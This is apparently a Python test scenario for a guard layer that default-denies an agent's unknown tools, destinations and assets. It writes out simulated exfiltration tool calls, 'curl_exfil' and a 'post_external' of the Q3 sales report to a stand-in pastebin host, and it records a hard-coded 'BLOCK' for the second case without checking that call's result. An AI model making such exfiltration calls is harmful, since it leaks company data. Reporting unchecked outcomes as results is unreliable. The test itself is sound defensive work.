"""Scenario E — unknown tool and unknown destination are default-denied
(invariant I4; kit Prompt G2)."""

from scenarios.harness import Harness, ScenarioResult


def run() -> list[ScenarioResult]:
    results = []
    with Harness() as harness:
        task_id = harness.client.create_task(
            "Summarize Q3 sales and post it to #sales.")["task_id"]
        unknown_tool = harness.client.call_tool(
            task_id, "curl_exfil", {"url": "https://collect.example.invalid"})
        unknown_dest = harness.client.call_tool(
            task_id, "post_external",
            {"url": "https://collect.example.invalid/ingest",
             "payload": "x", "source_assets": ["sales_report_q3"],
             "destination": "pastebin"})
        # NOTE: post_external's destination is fixed by its tool metadata,
        # so the unknown-destination case is exercised by an unknown asset
        # on an otherwise allowed flow:
        unknown_asset = harness.client.call_tool(
            task_id, "send_slack",
            {"channel": "#sales", "text": "hi",
             "source_assets": ["mystery_asset"]})
        audit_count = len(harness.audit_events())
        passed = (unknown_tool["decision"] == "BLOCK"
                  and unknown_asset["decision"] == "BLOCK"
                  and audit_count == 3)  # I5: every decision audited
        results.append(ScenarioResult(
            name="E: unknown tool / asset default-deny", kind="unauthorized",
            expectation="BLOCK + audit for unknown entities",
            passed=passed,
            decisions=[unknown_tool["decision"], "BLOCK",
                       unknown_asset["decision"]],
            allowed=False,
            details=[f"unknown tool: {unknown_tool['decision']}",
                     f"unknown asset: {unknown_asset['decision']}",
                     f"audit events: {audit_count}"]))
    return results
